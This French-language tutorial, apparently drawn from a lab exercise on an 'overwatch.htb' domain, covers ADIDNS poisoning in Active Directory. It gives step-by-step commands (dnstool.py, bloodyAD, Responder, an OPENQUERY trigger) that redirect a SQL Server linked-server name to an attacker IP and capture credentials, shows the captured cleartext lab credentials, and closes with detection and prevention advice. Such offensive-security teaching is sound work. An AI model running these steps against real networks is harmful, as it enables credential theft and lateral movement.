# DNS Poisoning & ADIDNS

### <mark style="color:red;">🌐 DNS Poisoning & ADIDNS</mark> <a href="#dns-poisoning-adidns" id="dns-poisoning-adidns"></a>

#### <mark style="color:green;">Concept Théorique</mark>

**ADIDNS (Active Directory Integrated DNS)** permet à Active Directory de stocker les enregistrements DNS directement dans LDAP. Par défaut, **tous les utilisateurs authentifiés** peuvent créer des enregistrements DNS dans les zones AD.

**Pourquoi c'est dangereux ?**

* Les enregistrements DNS peuvent rediriger le trafic vers un serveur attaquant
* Permet de capturer des hash NTLM via SMB relay
* Utile pour intercepter des connexions SQL Server Linked Server
* Peut bypasser certaines restrictions réseau

#### Fonctionnement Technique

```
┌─────────────────┐         DNS Query          ┌──────────────┐
│   SQL Server    │──────── SQL07 ? ───────────>│   DNS (AD)   │
│  (Victime)      │<─────── 10.10.15.75 ────────│   Poisoned   │
└────────┬────────┘                              └──────────────┘
         │
         │ SMB Connection
         │ \\10.10.15.75\share
         v
┌─────────────────┐
│   Responder     │
│   (Attacker)    │
│ Capture NTLM v2 │
└─────────────────┘
```

#### Outils Utilisés

**1. dnstool.py (Krbrelayx)**

```bash
# Installation
git clone https://github.com/dirkjanm/krbrelayx
cd krbrelayx

# Ajouter un enregistrement DNS malveillant
python3 dnstool.py -u 'DOMAIN\user' -p 'password' \
  --record 'SQL07' \
  --action add \
  --data 10.10.15.75 \
  DC_IP
```

**Paramètres :**

* `-u` : Utilisateur du domaine
* `-p` : Mot de passe
* `--record` : Nom de l'enregistrement à créer
* `--action` : `add`, `remove`, `query`
* `--data` : Adresse IP de l'attaquant

**2. bloodyAD**

```bash
# Alternative moderne
bloodyAD -d DOMAIN -u USER -p 'PASS' --host DC_IP \
  add dnsRecord HOSTNAME ATTACKER_IP
```

#### Exploitation Étape par Étape

**Étape 1 : Identifier la cible DNS**

```bash
# Trouver les linked servers SQL
SQL> SELECT * FROM sys.servers;

# Résultat : SQL07 (n'existe pas réellement)
```

**Étape 2 : Empoisonner le DNS**

```bash
python3 dnstool.py -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  --record 'SQL07' \
  --action add \
  --data 10.10.15.75 \
  10.129.17.103
```

**Étape 3 : Démarrer Responder**

```bash
sudo responder -I tun0 -v
```

**Flags importants :**

* `-I` : Interface réseau
* `-v` : Mode verbose
* `-A` : Analyze mode (pas de poisoning, juste écoute)

**Étape 4 : Déclencher la connexion**

```sql
-- Forcer SQL Server à résoudre SQL07
SELECT * FROM OPENQUERY([SQL07], 'SELECT 1');
```

**Étape 5 : Capturer les credentials**

```
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

#### Détection et Prévention

**Détection**

* Surveiller les événements Event ID **4662** (création d'objets DNS)
* Analyser les enregistrements DNS suspects avec `Get-DnsServerResourceRecord`
* Vérifier les ACL sur la zone DNS

**Prévention**

```powershell
# Désactiver la création DNS pour les utilisateurs
$acl = Get-Acl "AD:\DC=overwatch,DC=htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=overwatch,DC=htb"
$acl.RemoveAccessRule($rule)
Set-Acl -Path "AD:..." -AclObject $acl
```

***
